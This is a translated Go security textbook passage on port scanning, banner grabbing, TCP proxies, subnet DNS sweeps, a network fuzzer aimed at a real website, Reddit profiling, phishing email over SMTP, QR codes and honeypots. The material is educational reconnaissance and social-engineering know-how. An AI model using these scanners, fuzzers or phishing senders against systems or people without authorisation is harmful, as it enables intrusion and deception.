# Go 和安全（四）

> 原文：[`zh.annas-archive.org/md5/7656FC72AAECE258C02033B14E33EA12`](https://zh.annas-archive.org/md5/7656FC72AAECE258C02033B14E33EA12)
> 
> 译者：[飞龙](https://github.com/wizardforcel)
> 
> 协议：[CC BY-NC-SA 4.0](http://creativecommons.org/licenses/by-nc-sa/4.0/)

# 第十一章：主机发现和枚举

主机发现是查找网络上的主机的过程。如果你已经访问了私有网络上的一台机器，并且想要查看网络上的其他机器并开始收集网络的情况，这是很有用的。你也可以将整个互联网视为网络，并寻找特定类型的主机或者只是寻找任何主机。Ping 扫描和端口扫描是识别主机的常用技术。用于此目的的常用工具是 nmap。在本章中，我们将介绍使用 TCP 连接扫描和横幅抓取进行基本端口扫描，这是 nmap 的两种最常见用例。我们还将介绍可以用于手动交互和探索服务器端口的原始套接字连接。

枚举是一个类似的概念，但是指的是主动检查特定机器以获取尽可能多的信息。这包括扫描服务器的端口以查看哪个端口是开放的，获取横幅以检查服务，调用各种服务以获取版本号，并通常搜索攻击向量。

主机发现和枚举是有效渗透测试的关键步骤，因为如果你甚至不知道机器的存在，就无法利用它。例如，如果攻击者只知道如何使用`ping`命令查找主机，那么你可以通过简单地忽略 ping 请求来轻松地将所有主机隐藏起来，让攻击者无法找到。

主机发现和枚举需要与机器进行主动连接，这样你就会留下日志，可能触发警报，或者被注意到。有一些方法可以偷偷摸摸，比如只执行 TCP SYN 扫描，这样就不会建立完整的 TCP 连接，或者在连接时使用代理，这样不会隐藏你的存在，但会让它看起来好像你是从其他地方连接的。如果 IP 被阻止，使用代理隐藏你的 IP 可能是有用的，因为你可以简单地切换到新的代理。

本章还涵盖了模糊测试，尽管只是简要提及。模糊测试需要有自己的章节，事实上，已经有整本书专门讨论了这个主题。模糊测试在逆向工程或搜索漏洞时更有用，但也可以用于获取有关服务的信息。例如，一个服务可能不返回任何响应，让你对其用途一无所知，但如果你用错误的数据进行模糊测试，它返回一个错误，你可能会了解它期望接收的输入类型。

在本章中，我们将专门涵盖以下主题：

+   TCP 和 UDP 套接字

+   端口扫描

+   横幅抓取

+   TCP 代理

+   在网络上查找命名主机

+   模糊测试网络服务

# TCP 和 UDP 套接字

套接字是网络的构建模块。服务器使用套接字监听，客户端使用套接字拨号来绑定并共享信息。**Internet Protocol**（**IP**）层指定了机器的地址，但**Transmission Control Protocol**（**TCP**）或**User Datagram Protocol**（**UDP**）指定了机器上应该使用的端口。

两者之间的主要区别是连接状态。TCP 保持连接活动并验证消息是否已接收。UDP 只是发送消息而不从远程主机接收确认。

# 创建服务器

以下是一个示例服务器。如果要更改协议，可以将`net.Listen()`的`tcp`参数更改为`udp`：

```go
package main

import (
   "net"
   "fmt"
   "log"
)

var protocol = "tcp" // tcp or udp
var listenAddress = "localhost:3000"

func main() {
   listener, err := net.Listen(protocol, listenAddress)
   if err != nil {
      log.Fatal("Error creating listener. ", err)
   }
   log.Printf("Now listening for connections.")

   for {
      conn, err := listener.Accept()
      if err != nil {
         log.Println("Error accepting connection. ", err)
      }
      go handleConnection(conn)
   }
}

func handleConnection(conn net.Conn) {
   incomingMessageBuffer := make([]byte, 4096)

   numBytesRead, err := conn.Read(incomingMessageBuffer)
   if err != nil {
      log.Print("Error reading from client. ", err)
   }

   fmt.Fprintf(conn, "Thank you. I processed %d bytes.\n", 
      numBytesRead)
} 
```

# 创建客户端

这个示例创建了一个简单的网络客户端，可以与前面示例中的服务器一起工作。这个示例使用了 TCP，但是像`net.Listen()`一样，如果要切换协议，可以在`net.Dial()`中将`tcp`简单地替换为`udp`：

```go
package main

import (
   "net"
   "log"
)

var protocol = "tcp" // tcp or udp
var remoteHostAddress = "localhost:3000"

func main() {
   conn, err := net.Dial(protocol, remoteHostAddress)
   if err != nil {
      log.Fatal("Error creating listener. ", err)
   }
   conn.Write([]byte("Hello, server. Are you there?"))

   serverResponseBuffer := make([]byte, 4096)
   numBytesRead, err := conn.Read(serverResponseBuffer)
   if err != nil {
      log.Print("Error reading from server. ", err)
   }
   log.Println("Message recieved from server:")
   log.Printf("%s\n", serverResponseBuffer[0:numBytesRead])
} 
```

# 端口扫描

在找到网络上的主机之后，也许在进行 ping 扫描或监视网络流量之后，通常希望扫描端口并查看哪些端口是打开的并接受连接。通过查看哪些端口是打开的，您可以了解有关机器的很多信息。您可能能够确定它是 Windows 还是 Linux，或者它是否托管电子邮件服务器、Web 服务器、数据库服务器等。

有许多类型的端口扫描，但这个例子演示了最基本和直接的端口扫描示例，即 TCP 连接扫描。它像任何典型的客户端一样连接，并查看服务器是否接受请求。它不发送或接收任何数据，并立即断开连接，记录是否成功。

以下示例仅扫描本地主机，并将检查的端口限制为保留端口 0-1024。数据库服务器，如 MySQL，通常在较高的端口上侦听，例如`3306`，因此您将需要调整端口范围或使用常见端口的预定义列表。

每个 TCP 连接请求都在单独的 goroutine 中完成，因此它们都将并发运行，并且完成非常快。使用`net.DialTimeout()`函数，以便我们可以设置我们愿意等待的最长时间：

```go
package main

import (
   "strconv"
   "log"
   "net"
   "time"
)

var ipToScan = "127.0.0.1"
var minPort = 0
var maxPort = 1024

func main() {
   activeThreads := 0
   doneChannel := make(chan bool)

   for port := minPort; port <= maxPort ; port++ {
      go testTcpConnection(ipToScan, port, doneChannel)
      activeThreads++
   }

   // Wait for all threads to finish
   for activeThreads > 0 {
      <- doneChannel
      activeThreads--
   }
}

func testTcpConnection(ip string, port int, doneChannel chan bool) {
   _, err := net.DialTimeout("tcp", ip + ":" + strconv.Itoa(port), 
      time.Second*10)
   if err == nil {
      log.Printf("Port %d: Open\n", port)
   }
   doneChannel <- true
} 
```

# 从服务获取横幅

确定打开的端口后，您可以尝试从连接中读取并查看服务是否提供横幅或初始消息。

以下示例与前一个示例类似，但不仅连接和断开连接，而是连接并尝试从服务器读取初始消息。如果服务器提供任何数据，则打印出来，但如果服务器没有发送任何数据，则不会打印任何内容：

```go
package main

import (
   "strconv"
   "log"
   "net"
   "time"
)

var ipToScan = "127.0.0.1"

func main() {
   activeThreads := 0
   doneChannel := make(chan bool)

   for port := 0; port <= 1024 ; port++ {
      go grabBanner(ipToScan, port, doneChannel)
      activeThreads++
   }

   // Wait for all threads to finish
   for activeThreads > 0 {
      <- doneChannel
      activeThreads--
   }
}

func grabBanner(ip string, port int, doneChannel chan bool) {
   connection, err := net.DialTimeout(
      "tcp", 
      ip + ":"+strconv.Itoa(port),  
      time.Second*10)
   if err != nil {
      doneChannel<-true
      return
   }

   // See if server offers anything to read
   buffer := make([]byte, 4096)
   connection.SetReadDeadline(time.Now().Add(time.Second*5)) 
   // Set timeout
   numBytesRead, err := connection.Read(buffer)
   if err != nil {
      doneChannel<-true
      return
   }
   log.Printf("Banner from port %d\n%s\n", port,
      buffer[0:numBytesRead])

   doneChannel <- true
} 
```

# 创建 TCP 代理

与第九章中的 HTTP 代理类似，TCP 级别代理对于调试、记录、分析流量和保护隐私都很有用。在进行端口扫描、主机发现和枚举时，代理可以隐藏您的位置和源 IP 地址。您可能希望隐藏您的来源地，伪装您的身份，或者只是使用一次性 IP，以防因执行请求而被列入黑名单。

以下示例将监听本地端口，将请求转发到远程主机，然后将远程服务器的响应发送回客户端。它还会记录任何请求。

您可以通过在上一节中运行服务器，然后设置代理以转发到该服务器来测试此代理。当回显服务器和代理服务器正在运行时，使用 TCP 客户端连接到代理服务器：

```go
package main

import (
   "net"
   "log"
)

var localListenAddress = "localhost:9999"
var remoteHostAddress = "localhost:3000" // Not required to be remote

func main() {
   listener, err := net.Listen("tcp", localListenAddress)
   if err != nil {
      log.Fatal("Error creating listener. ", err)
   }

   for {
      conn, err := listener.Accept()
      if err != nil {
         log.Println("Error accepting connection. ", err)
      }
      go handleConnection(conn)
   }
}

// Forward the request to the remote host and pass response 
// back to client
func handleConnection(localConn net.Conn) {
   // Create remote connection that will receive forwarded data
   remoteConn, err := net.Dial("tcp", remoteHostAddress)
   if err != nil {
      log.Fatal("Error creating listener. ", err)
   }
   defer remoteConn.Close()

   // Read from the client and forward to remote host
   buf := make([]byte, 4096) // 4k buffer
   numBytesRead, err := localConn.Read(buf)
   if err != nil {
      log.Println("Error reading from client.", err)
   }
   log.Printf(
      "Forwarding from %s to %s:\n%s\n\n",
      localConn.LocalAddr(),
      remoteConn.RemoteAddr(),
      buf[0:numBytesRead],
   )
   _, err = remoteConn.Write(buf[0:numBytesRead])
   if err != nil {
      log.Println("Error writing to remote host. ", err)
   }

   // Read response from remote host and pass it back to our client
   buf = make([]byte, 4096)
   numBytesRead, err = remoteConn.Read(buf)
   if err != nil {
      log.Println("Error reading from remote host. ", err)
   }
   log.Printf(
      "Passing response back from %s to %s:\n%s\n\n",
      remoteConn.RemoteAddr(),
      localConn.LocalAddr(),
      buf[0:numBytesRead],
   )
   _, err = localConn.Write(buf[0:numBytesRead])
   if err != nil {
      log.Println("Error writing back to client.", err)
   }
}
```

# 在网络上查找命名主机

如果您刚刚获得对网络的访问权限，您可以做的第一件事之一是了解网络上有哪些主机。您可以扫描子网上的所有 IP 地址，然后进行 DNS 查找，看看是否可以找到任何命名主机。主机名可以具有描述性或信息性的名称，可以提供有关服务器可能正在运行的内容的线索。

纯 Go 解析器是默认的，只能阻塞一个 goroutine 而不是系统线程，这样更有效率一些。您可以使用环境变量显式设置 DNS 解析器：

```go
export GODEBUG=netdns=go    # Use pure Go resolver (default)
export GODEBUG=netdns=cgo   # Use cgo resolver
```

这个例子寻找子网上的每个可能的主机，并尝试为每个 IP 解析主机名：

```go
package main

import (
   "strconv"
   "log"
   "net"
   "strings"
)

var subnetToScan = "192.168.0" // First three octets

func main() {
   activeThreads := 0
   doneChannel := make(chan bool)

   for ip := 0; ip <= 255; ip++ {
      fullIp := subnetToScan + "." + strconv.Itoa(ip)
      go resolve(fullIp, doneChannel)
      activeThreads++
   }

   // Wait for all threads to finish
   for activeThreads > 0 {
      <- doneChannel
      activeThreads--
   }
}

func resolve(ip string, doneChannel chan bool) {
   addresses, err := net.LookupAddr(ip)
   if err == nil {
      log.Printf("%s - %s\n", ip, strings.Join(addresses, ", "))
   }
   doneChannel <- true
} 
```

# 对网络服务进行模糊测试

模糊测试是指向应用程序发送故意格式不正确、过多或随机的数据，以使其行为异常、崩溃或泄露敏感信息。您可以识别缓冲区溢出漏洞，这可能导致远程代码执行。如果在向应用程序发送特定大小的数据后导致其崩溃或停止响应，可能是由于缓冲区溢出引起的。

有时，你可能会因为使服务使用过多内存或占用所有处理能力而导致拒绝服务。正则表达式因其速度慢而臭名昭著，并且可以在 Web 应用程序的 URL 路由机制中被滥用，用少量请求就可以消耗所有 CPU。

非随机但格式错误的数据可能同样危险，甚至更危险。一个正确格式错误的视频文件可能会导致 VLC 崩溃并暴露代码执行。一个正确格式错误的数据包，只需改变 1 个字节，就可能导致敏感数据暴露，就像 Heartbleed OpenSSL 漏洞一样。

以下示例将演示一个非常基本的 TCP 模糊器。它向服务器发送逐渐增加长度的随机字节。它从 1 字节开始，按 2 的幂指数级增长。首先发送 1 字节，然后是 2、4、8、16，一直持续到返回错误或达到最大配置限制。

调整`maxFuzzBytes`以设置要发送到服务的数据的最大大小。请注意，它会同时启动所有线程，所以要小心服务器的负载。寻找响应中的异常或服务器的崩溃。

```go
package main

import (
   "crypto/rand"
   "log"
   "net"
   "strconv"
   "time"
)

var ipToScan = "www.devdungeon.com"
var port = 80
var maxFuzzBytes = 1024

func main() {
   activeThreads := 0
   doneChannel := make(chan bool)

   for fuzzSize := 1; fuzzSize <= maxFuzzBytes; 
      fuzzSize = fuzzSize * 2 {
      go fuzz(ipToScan, port, fuzzSize, doneChannel)
      activeThreads++
   }

   // Wait for all threads to finish
   for activeThreads > 0 {
      <- doneChannel
      activeThreads--
   }
}

func fuzz(ip string, port int, fuzzSize int, doneChannel chan bool) {
   log.Printf("Fuzzing %d.\n", fuzzSize)

   conn, err := net.DialTimeout("tcp", ip + ":" + strconv.Itoa(port), 
      time.Second*10)
   if err != nil {
      log.Printf(
         "Fuzz of %d attempted. Could not connect to server. %s\n", 
         fuzzSize, 
         err,
      )
      doneChannel <- true
      return
   }

   // Write random bytes to server
   randomBytes := make([]byte, fuzzSize)
   rand.Read(randomBytes)
   conn.SetWriteDeadline(time.Now().Add(time.Second * 5))
   numBytesWritten, err := conn.Write(randomBytes)
   if err != nil { // Error writing
      log.Printf(
         "Fuzz of %d attempted. Could not write to server. %s\n", 
         fuzzSize,
         err,
      )
      doneChannel <- true
      return
   }
   if numBytesWritten != fuzzSize {
      log.Printf("Unable to write the full %d bytes.\n", fuzzSize)
   }
   log.Printf("Sent %d bytes:\n%s\n\n", numBytesWritten, randomBytes)

   // Read up to 4k back
   readBuffer := make([]byte, 4096)
   conn.SetReadDeadline(time.Now().Add(time.Second *5))
   numBytesRead, err := conn.Read(readBuffer)
   if err != nil { // Error reading
      log.Printf(
         "Fuzz of %d attempted. Could not read from server. %s\n", 
         fuzzSize,
         err,
      )
      doneChannel <- true
      return
   }

   log.Printf(
      "Sent %d bytes to server. Read %d bytes back:\n,
      fuzzSize,
      numBytesRead, 
   )
   log.Printf(
      "Data:\n%s\n\n",
      readBuffer[0:numBytesRead],
   )
   doneChannel <- true
} 
```

# 总结

阅读完本章后，你现在应该了解主机发现和枚举的基本概念。你应该能够在高层次上解释它们，并提供每个概念的基本示例。

首先，我们讨论了原始的 TCP 套接字，以一个简单的服务器和客户端为例。这些例子本身并不是非常有用，但它们是构建执行与服务的自定义交互的工具的模板。在尝试对未识别的服务进行指纹识别时，这将是有帮助的。

现在你应该知道如何运行一个简单的端口扫描，以及为什么你可能想要运行一个端口扫描。你应该了解如何使用 TCP 代理以及它提供了什么好处。你应该了解横幅抓取的工作原理以及为什么它是一种收集信息的有用方法。

还有许多其他形式的枚举。在 Web 应用程序中，你可以枚举用户名、用户 ID、电子邮件等。例如，如果一个网站使用 URL 格式[www.example.com/user_profile/1234](http://www.example.com/user_profile/1234)，你可以从数字 1 开始，逐渐增加 1，遍历网站上的每个用户资料。其他形式包括 SNMP、DNS、LDAP 和 SMB。

你还能想到哪些其他形式的枚举？如果你已经是一个权限较低的用户，你能想到什么样的枚举？一旦你拥有一个 shell，你会想收集关于服务器的什么样的信息？

一旦你在服务器上，你可以收集大量信息：用户名和组、主机名、网络设备信息、挂载的文件系统、正在运行的服务、iptables 设置、定时作业、启动服务等等。有关在已经访问到机器后该做什么的更多信息，请参阅第十三章，*后期利用*。

在下一章中，我们将讨论社会工程学以及如何通过 JSON REST API 从 Web 上收集情报，发送钓鱼邮件和生成 QR 码。我们还将看到多个蜜罐的例子，包括 TCP 蜜罐和两种 HTTP 蜜罐的方法。


# 第十二章：社会工程

社会工程是指攻击者操纵或欺骗受害者执行某项行动或提供私人信息。这通常是通过冒充信任的人、制造紧急感或制造虚假前提来推动受害者采取行动。行动可能只是泄露信息，也可能更复杂，比如下载和执行恶意软件。

本章涵盖了蜜罐，尽管有时它们旨在欺骗机器人而不是人类。目标是故意欺骗，这是社会工程的核心。我们提供了基本的蜜罐示例，包括 TCP 和 HTTP 蜜罐。

本书未涵盖许多其他类型的社会工程。这包括物理或面对面的情况，例如尾随和假装是维护工作人员，以及其他数字和远程方法，例如电话呼叫、短信和社交媒体消息。

社会工程在法律上可能是一个灰色地带。例如，即使公司允许您对其员工进行社会工程，也不代表您有权钓取员工的个人电子邮件凭据。要意识到法律和道德的边界。

在本章中，我们将具体涵盖以下主题：

+   使用 Reddit 的 JSON REST API 收集个人情报

+   使用 SMTP 发送钓鱼邮件

+   生成 QR 码和对图像进行 base64 编码

+   蜜罐

# 通过 JSON REST API 收集情报

REST 与 JSON 正成为 Web API 的事实标准接口。每个 API 都不同，因此此示例的主要目标是展示如何从 REST 端点处理 JSON 数据。

此示例将以 Reddit 用户名作为参数，并打印该用户的最新帖子和评论，以了解他们讨论的话题。选择 Reddit 作为示例的原因是因为对于某些端点不需要进行身份验证，这样可以方便进行测试。其他提供 REST API 的服务，例如 Twitter 和 LinkedIn，也可以用于情报收集。

请记住，此示例的重点是提供从 REST 端点解析 JSON 的示例。由于每个 API 都不同，此示例应该作为参考，以便在编写自己的程序与 JSON API 交互时使用。必须定义一个数据结构以匹配 JSON 端点的响应。在此示例中，创建的数据结构与 Reddit 的响应匹配。

在 Go 中使用 JSON 时，首先需要定义数据结构，然后使用`Marshal`和`Unmarshal`函数在原始字符串和结构化数据格式之间进行编码和解码。以下示例创建了一个与 Reddit 返回的 JSON 结构匹配的数据结构。然后使用`Unmarshal`函数将字符串转换为 Go 数据对象。您不必为 JSON 中的每个数据创建一个变量。您可以省略不需要的字段。

JSON 响应中的数据是嵌套的，因此我们将利用匿名结构。这样可以避免为每个嵌套级别创建单独的命名类型。此示例创建了一个命名结构，其中所有嵌套级别都存储为嵌入的匿名结构。

Go 数据结构中的变量名与 JSON 响应中提供的变量名不匹配，因此在定义结构时，JSON 变量名直接提供在数据类型之后。这样可以使变量正确地从 JSON 数据映射到 Go 结构。这通常是必要的，因为 Go 数据结构中的变量名是区分大小写的。

请注意，每个网络服务都有自己的服务条款，这可能会限制或限制您访问其网站的方式。一些网站有规定禁止抓取数据，其他网站有访问限制。虽然这可能不构成刑事犯罪，但服务可能会因违反服务条款而封锁您的账户或 IP 地址。请务必阅读您与之互动的每个网站或 API 的服务条款。

此示例的代码如下：

```go
package main

import (
   "encoding/json"
   "fmt"
   "io/ioutil"
   "log"
   "net/http"
   "os"
   "time"
)

// Define the structure of the JSON response
// The json variable names are specified on
// the right since they do not match the
// struct variable names exactly
type redditUserJsonResponse struct {
   Data struct {
      Posts []struct { // Posts & comments
         Data struct {
            Subreddit  string  `json:"subreddit"`
            Title      string  `json:"link_title"`
            PostedTime float32 `json:"created_utc"`
            Body       string  `json:"body"`
         } `json:"data"`
      } `json:"children"`
   } `json:"data"`
}

func printUsage() {
   fmt.Println(os.Args[0] + ` - Print recent Reddit posts by a user

Usage: ` + os.Args[0] + ` <username>
Example: ` + os.Args[0] + ` nanodano
`)
}

func main() {
   if len(os.Args) != 2 {
      printUsage()
      os.Exit(1)
   }
   url := "https://www.reddit.com/user/" + os.Args[1] + ".json"

   // Make HTTP request and read response
   response, err := http.Get(url)
   if err != nil {
      log.Fatal("Error making HTTP request. ", err)
   }
   defer response.Body.Close()
   body, err := ioutil.ReadAll(response.Body)
   if err != nil {
      log.Fatal("Error reading HTTP response body. ", err)
   }

   // Decode response into data struct
   var redditUserInfo redditUserJsonResponse
   err = json.Unmarshal(body, &redditUserInfo)
   if err != nil {
      log.Fatal("Error parson JSON. ", err)
   }

   if len(redditUserInfo.Data.Posts) == 0 {
      fmt.Println("No posts found.")
      fmt.Printf("Response Body: %s\n", body)
   }

   // Iterate through all posts found
   for _, post := range redditUserInfo.Data.Posts {
      fmt.Println("Subreddit:", post.Data.Subreddit)
      fmt.Println("Title:", post.Data.Title)
      fmt.Println("Posted:", time.Unix(int64(post.Data.PostedTime), 
         0))
      fmt.Println("Body:", post.Data.Body)
      fmt.Println("========================================")
   }
} 
```

# 使用 SMTP 发送网络钓鱼电子邮件

网络钓鱼是攻击者试图通过伪装成可信任来源的合法电子邮件或其他形式的通信来获取敏感信息的过程。

网络钓鱼通常通过电子邮件进行，但也可以通过电话、社交媒体或短信进行。我们专注于电子邮件方法。网络钓鱼可以大规模进行，向大量收件人发送通用电子邮件，希望有人会上当。*尼日利亚王子*电子邮件诈骗是一种流行的网络钓鱼活动。其他提供激励的电子邮件也很受欢迎，并且相对有效，例如提供 iPhone 赠品或礼品卡，如果他们参与并按照您提供的链接登录其凭据。网络钓鱼电子邮件还经常模仿使用真实签名和公司标志的合法发件人。通常会制造紧急感，以说服受害者迅速采取行动，而不遵循标准程序。

您可以使用第十章中提取网页中的电子邮件的程序*网络抓取*来收集电子邮件。将电子邮件提取功能与提供的网络爬虫示例结合起来，您就可以强大地从域中抓取电子邮件。

**鱼叉式网络钓鱼**是针对少数目标的有针对性的网络钓鱼的术语，甚至可能只针对一个特定目标。鱼叉式网络钓鱼需要更多的研究和定位，定制特定于个人的电子邮件，创建一个可信的前提，也许是冒充他们认识的人。鱼叉式网络钓鱼需要更多的工作，但它增加了愚弄用户的可能性，并减少了被垃圾邮件过滤器抓住的机会。

在尝试鱼叉式网络钓鱼活动时，您应该在撰写电子邮件之前首先收集有关目标的尽可能多的信息。在本章的早些时候，我们谈到了使用 JSON REST API 来收集有关目标的数据。如果您的目标个人或组织有网站，您还可以使用第十章中的字数统计程序和标题抓取程序，*网络抓取*。收集网站的最常见单词和标题可能是快速了解目标所属行业或可能提供的产品和服务的方法。

Go 标准库附带了用于发送电子邮件的 SMTP 包。Go 还有一个`net/mail`包，用于解析电子邮件（[`golang.org/pkg/net/mail/`](https://golang.org/pkg/net/mail/)）。`mail`包相对较小，本书未涵盖，但它允许您将电子邮件的完整文本解析为消息类型，从而让您单独提取正文和标题。此示例侧重于如何使用 SMTP 包发送电子邮件。

配置变量都在源代码的顶部定义。请确保设置正确的 SMTP 主机、端口、发件人和密码。常见的 SMTP 端口是`25`用于未加密访问，端口`465`和`587`通常用于加密访问。所有设置都将取决于您的 SMTP 服务器的配置。如果没有首先设置正确的服务器和凭据，此示例将无法正确运行。如果您有 Gmail 帐户，您可以重用大部分预填充的值，只需替换发件人和密码。

如果您正在使用 Gmail 发送邮件并使用双因素身份验证，则需要在[`security.google.com/settings/security/apppasswords`](https://security.google.com/settings/security/apppasswords)上创建一个应用程序专用密码。如果您不使用双因素身份验证，则可以在[`myaccount.google.com/lesssecureapps`](https://myaccount.google.com/lesssecureapps)上启用不安全的应用程序。

该程序创建并发送了两封示例电子邮件，一封是文本，一封是 HTML。还可以发送组合的文本和 HTML 电子邮件，其中电子邮件客户端选择渲染哪个版本。这可以通过将`Content-Type`标头设置为`multipart/alternative`并设置一个边界来区分文本电子邮件的结束和 HTML 电子邮件的开始来实现。这里没有涵盖发送组合的文本和 HTML 电子邮件，但值得一提。您可以在[`www.w3.org/Protocols/rfc1341/7_2_Multipart.html`](https://www.w3.org/Protocols/rfc1341/7_2_Multipart.html)上了解有关`multipart`内容类型的更多信息，*RFC 1341*。

Go 还提供了一个`template`软件包，允许您创建一个带有变量占位符的模板文件，然后使用来自结构体的数据填充占位符。如果您想要将模板文件与源代码分开，以便在不重新编译应用程序的情况下修改模板，模板将非常有用。以下示例不使用模板，但您可以在[`golang.org/pkg/text/template/`](https://golang.org/pkg/text/template/)上阅读更多关于模板的信息：

```go
package main

import (
   "log"
   "net/smtp"
   "strings"
)

var (
   smtpHost   = "smtp.gmail.com"
   smtpPort   = "587"
   sender     = "sender@gmail.com"
   password   = "SecretPassword"
   recipients = []string{
      "recipient1@example.com",
      "recipient2@example.com",
   }
   subject = "Subject Line"
)

func main() {
   auth := smtp.PlainAuth("", sender, password, smtpHost)

   textEmail := []byte(
      `To: ` + strings.Join(recipients, ", ") + `
Mime-Version: 1.0
Content-Type: text/plain; charset="UTF-8";
Subject: ` + subject + `

Hello,

This is a plain text email.
`)

   htmlEmail := []byte(
      `To: ` + strings.Join(recipients, ", ") + `
Mime-Version: 1.0
Content-Type: text/html; charset="UTF-8";
Subject: ` + subject + `

<html>
<h1>Hello</h1>
<hr />
<p>This is an <strong>HTML</strong> email.</p>
</html>
`)

   // Send text version of email
   err := smtp.SendMail(
      smtpHost+":"+smtpPort,
      auth,
      sender,
      recipients,
      textEmail,
   )
   if err != nil {
      log.Fatal(err)
   }

   // Send HTML version
   err = smtp.SendMail(
      smtpHost+":"+smtpPort,
      auth,
      sender,
      recipients,
      htmlEmail,
   )
   if err != nil {
      log.Fatal(err)
   }
}
```

# 生成 QR 码

**快速响应**（**QR**）码是一种二维条形码。它存储的信息比传统的一维线条形码更多。它们最初是在日本汽车工业中开发的，但已被其他行业采用。QR 码于 2000 年被 ISO 批准为国际标准。最新规范可在[`www.iso.org/standard/62021.html`](https://www.iso.org/standard/62021.html)上找到。

QR 码可以在一些广告牌、海报、传单和其他广告材料上找到。QR 码也经常用于交易中。您可能会在火车票上看到 QR 码，或者在发送和接收比特币等加密货币时看到 QR 码。一些身份验证服务，如双因素身份验证，利用 QR 码的便利性。

QR 码对社会工程学很有用，因为人类无法仅通过查看 QR 码来判断它是否恶意。往往 QR 码包含一个立即加载的 URL，使用户面临风险。如果您创建一个可信的借口，您可能会说服用户相信 QR 码。

此示例中使用的软件包称为`go-qrcode`，可在[`github.com/skip2/go-qrcode`](https://github.com/skip2/go-qrcode)上找到。这是一个在 GitHub 上可用的第三方库，不受 Google 或 Go 团队支持。`go-qrcode`软件包利用了标准库图像软件包：`image`，`image/color`和`image/png`。

使用以下命令安装`go-qrcode`软件包：

```go
go get github.com/skip2/go-qrcode/...
```

`go get`中的省略号（`...`）是通配符。它还将安装所有子软件包。

根据软件包作者的说法，QR 码的最大容量取决于编码的内容和错误恢复级别。最大容量为 2953 字节，4296 个字母数字字符，7089 个数字，或者是它们的组合。

该程序演示了两个主要点。首先是如何生成原始 PNG 字节形式的 QR 码，然后将要嵌入 HTML 页面的数据进行 base64 编码。完整的 HTML`img`标签被生成，并作为标准输出输出，可以直接复制粘贴到 HTML 页面中。第二部分演示了如何简单地生成 QR 码并直接写入文件。

这个例子生成了一个 PNG 格式的二维码图片。让我们提供你想要编码的文本和输出文件名作为命令行参数，程序将输出将你的数据编码为 QR 图像的图片：

```go
package main 

import (
   "encoding/base64"
   "fmt"
   "github.com/skip2/go-qrcode"
   "log"
   "os"
)

var (
   pngData        []byte
   imageSize      = 256 // Length and width in pixels
   err            error
   outputFilename string
   dataToEncode   string
)

// Check command line arguments. Print usage
// if expected arguments are not present
func checkArgs() {
   if len(os.Args) != 3 {
      fmt.Println(os.Args[0] + `

Generate a QR code. Outputs a PNG file in <outputFilename>.
Also outputs an HTML img tag with the image base64 encoded to STDOUT.

 Usage: ` + os.Args[0] + ` <outputFilename> <data>
 Example: ` + os.Args[0] + ` qrcode.png https://www.devdungeon.com`)
      os.Exit(1)
   }
   // Because these variables were above, at the package level
   // we don't have to return them. The same variables are
   // already accessible in the main() function
   outputFilename = os.Args[1]
   dataToEncode = os.Args[2]
}

func main() {
   checkArgs()

   // Generate raw binary data for PNG
   pngData, err = qrcode.Encode(dataToEncode, qrcode.Medium, 
      imageSize)
   if err != nil {
      log.Fatal("Error generating QR code. ", err)
   }

   // Encode the PNG data with base64 encoding
   encodedPngData := base64.StdEncoding.EncodeToString(pngData)

   // Output base64 encoded image as HTML image tag to STDOUT
   // This img tag can be embedded in an HTML page
   imgTag := "<img src=\"data:image/png;base64," + 
      encodedPngData + "\"/>"
   fmt.Println(imgTag) // For use in HTML

   // Generate and write to file with one function
   // This is a standalone function. It can be used by itself
   // without any of the above code
   err = qrcode.WriteFile(
      dataToEncode,
      qrcode.Medium,
      imageSize,
      outputFilename,
   )
   if err != nil {
      log.Fatal("Error generating QR code to file. ", err)
   }
} 
```

# Base64 编码数据

在前面的例子中，QR 码是 base64 编码的。由于这是一个常见的任务，值得介绍如何进行编码和解码。任何时候需要将二进制数据存储或传输为字符串时，base64 编码都是有用的。

这个例子演示了编码和解码字节切片的一个非常简单的用例。进行 base64 编码和解码的两个重要函数是`EncodeToString()`和`DecodeString()`：

```go
package main

import (
   "encoding/base64"
   "fmt"
   "log"
)

func main() {
   data := []byte("Test data")

   // Encode bytes to base64 encoded string.
   encodedString := base64.StdEncoding.EncodeToString(data)
   fmt.Printf("%s\n", encodedString)

   // Decode base64 encoded string to bytes.
   decodedData, err := base64.StdEncoding.DecodeString(encodedString)
   if err != nil {
      log.Fatal("Error decoding data. ", err)
   }
   fmt.Printf("%s\n", decodedData)
} 
```

# 蜜罐

蜜罐是你设置的用来捕捉攻击者的假服务。你故意设置一个服务，目的是引诱攻击者，让他们误以为这个服务是真实的，并包含某种敏感信息。通常，蜜罐被伪装成一个旧的、过时的、容易受攻击的服务器。日志记录或警报可以附加到蜜罐上，以快速识别潜在的攻击者。在你的内部网络上设置一个蜜罐可能会在任何系统被入侵之前警告你有攻击者的存在。

当攻击者攻击一台机器时，他们经常使用被攻击的机器来继续枚举、攻击和转移。如果你网络上的一个蜜罐检测到来自你网络上另一台机器的奇怪行为，比如端口扫描或登录尝试，那么表现奇怪的机器可能已经被攻击。

蜜罐有许多不同种类。它可以是从简单的 TCP 监听器，记录任何连接，到一个带有登录表单字段的假 HTML 页面，或者看起来像一个真实员工门户的完整的网络应用程序。如果攻击者认为他们已经找到了一个关键的应用程序，他们更有可能花时间试图获取访问权限。如果你设置有吸引力的蜜罐，你可能会让攻击者花费大部分时间在一个无用的蜜罐上。如果保留了详细的日志记录，你可以了解攻击者正在使用什么方法，他们有什么工具，甚至可能是他们的位置。

还有一些其他类型的蜜罐值得一提，但在这本书中没有进行演示：

+   **SMTP 蜜罐**：这模拟了一个开放的电子邮件中继，垃圾邮件发送者滥用它来捕捉试图使用你的邮件发送程序的垃圾邮件发送者。

+   **网络爬虫蜜罐**：这些是不打算被人访问的隐藏网页，但是链接到它的链接被隐藏在你网站的公共位置，比如 HTML 注释中，用来捕捉蜘蛛、爬虫和网页抓取器。

+   **数据库蜜罐**：这是一个带有详细日志记录以检测攻击者的假或真实数据库，可能还包含假数据以查看攻击者感兴趣的信息。

+   **蜜罐网络**：这是一个充满蜜罐的整个网络，旨在看起来像一个真实的网络，甚至可以自动化或伪造客户端流量到蜜罐服务，以模拟真实用户。

攻击者可能能够发现明显的蜜罐服务并避开它们。我建议你选择两个极端之一：尽可能使蜜罐模仿一个真实的服务，或者使服务成为一个不向攻击者透露任何信息的完全黑匣子。

